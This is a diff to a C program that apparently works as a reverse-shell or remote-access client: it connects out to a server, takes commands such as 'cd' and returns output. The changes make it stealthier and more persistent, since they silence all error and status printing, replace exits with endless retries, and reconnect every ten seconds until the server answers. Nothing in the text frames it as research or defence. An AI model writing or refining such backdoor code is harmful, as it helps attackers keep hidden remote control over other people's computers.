@@ -8,6 +8,8 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
+#define SLEEP_TIME 10
+
 int main()
 {
 	struct sockaddr_in ServerAddr;
@@ -29,27 +31,29 @@ int main()
 
 	char *tmp = NULL;
 	int i = 2;
+	int connect_res = -1;
 	FILE *fp = NULL;
 
-	if((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+	while((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 	{
-		perror("Client SocketError\n");
-		return 1;
+		//perror("Client SocketError\n");
+		//return 1;
 	}
-	if(connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len) < 0)
+	while(connect_res < 0)
 	{
-		perror("Client ConnectError\n");
-		return 1;
+		connect_res = connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len);
+		if(connect_res < 0)
+			sleep(SLEEP_TIME);
 	}
 
-	printf("Client Connected With Server:%s...\n", ServerAddrStr);
+	//printf("Client Connected With Server:%s...\n", ServerAddrStr);
 	send(ClientSocket, sendbuf, strnlen(sendbuf, 1450), 0);
 	memset(sendbuf, 0, 1450);
 
 	while(1)
 	{
 		iDataNum = recv(ClientSocket, buf, 200, 0);
-		printf("%s.\n", buf);
+		//printf("%s.\n", buf);
 		if(!memcmp(buf, "cd", 2))
 		{
 			tmp = &(buf[3]);
@@ -81,15 +85,17 @@ int main()
 			}
 		}
 
-		if((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+		while((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 		{
-			perror("Client SocketError\n");
-			return 1;
+			//perror("Client SocketError\n");
+			//return 1;
 		}
-		if(connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len) < 0)
+		connect_res = -1;
+		while(connect_res < 0)
 		{
-			perror("Client ConnectError\n");
-			return 1;
+			connect_res = connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len);
+			if(connect_res < 0)
+				sleep(SLEEP_TIME);
 		}
 
 		//printf("%s", sendbuf);
